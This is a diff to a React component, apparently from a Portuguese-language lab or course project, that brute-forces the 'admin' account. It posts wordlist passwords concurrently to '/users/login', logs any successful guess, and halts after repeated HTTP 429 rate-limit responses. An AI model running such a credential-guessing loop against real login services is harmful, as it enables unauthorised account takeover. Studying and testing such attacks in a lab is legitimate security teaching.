@@ -1,6 +1,7 @@
 import React from 'react'
 import wordlist from '../data/wordlist'
 import myfetch from '../lib/myfetch'
+import AppRoutes from '../routes/AppRoutes'
 
 export default function BruteForce() {
     const [logs, setLogs] = React.useState([])
@@ -30,26 +31,49 @@ export default function BruteForce() {
 
         const batchSize = concurrency
         let found = false
+        let consecutive429 = 0
 
-        for (let i = 0; i < wordlist.length && !found; i += batchSize) {
+        for (let i = 0; i < wordlist.length && !found && !stopRef.current; i += batchSize) {
             if (stopRef.current) break
 
             const batch = wordlist.slice(i, i + batchSize)
-            const promises = batch.map((password, index) =>
-                tryPassword(password)
-                    .then(result => {
-                        const attemptNumber = i + index
-                        const newLog = result === 'OK'
-                            ? `SENHA ENCONTRADA, tentativa nº ${attemptNumber}: ${password}`
-                            : `Tentativa nº ${attemptNumber} (${password}) => ${result}`
-
-                        setLogs(prevLogs => [newLog, ...prevLogs])
-                        return result
+            const promises = batch.map(password =>
+                myfetch.post('/users/login', { username: 'admin', password })
+                    .then(() => ({ status: 200, result: 'OK', password }))
+                    .catch(error => {
+                        const status = error?.response?.status ?? error?.status ?? null
+                        return { status, result: error?.message ?? String(error), password }
                     })
             )
 
             const results = await Promise.all(promises)
-            found = results.some(result => result === 'OK')
+
+            for (let idx = 0; idx < results.length; idx++) {
+                const res = results[idx]
+                const attemptNumber = i + idx
+
+                if (res.result === 'OK') {
+                    const newLog = `SENHA ENCONTRADA, tentativa nº ${attemptNumber}: ${res.password}`
+                    setLogs(prevLogs => [newLog, ...prevLogs])
+                    found = true
+                    break
+                } else {
+                    const statusText = res.status ? ` (HTTP ${res.status})` : ''
+                    const newLog = `Tentativa nº ${attemptNumber} (${res.password}) => ${res.result}${statusText}`
+                    setLogs(prevLogs => [newLog, ...prevLogs])
+
+                    if (res.status === 429) {
+                        consecutive429++
+                        if (consecutive429 >= 5) {
+                            setLogs(prev => ['Recebido HTTP 429 cinco vezes consecutivas — interrompendo.', ...prev])
+                            stopRef.current = true
+                            break
+                        }
+                    } else {
+                        consecutive429 = 0
+                    }
+                }
+            }
 
             // Pequena pausa para evitar bloqueio da UI
             await new Promise(resolve => requestAnimationFrame(resolve))
@@ -65,6 +89,8 @@ export default function BruteForce() {
     return (
         <>
             <h1>Ataque de força bruta no <em>login</em></h1>
+            {/* Renderiza as rotas do app */}
+            <AppRoutes />
             <div style={{ marginBottom: '1rem' }}>
                 <label>
                     Concorrência:
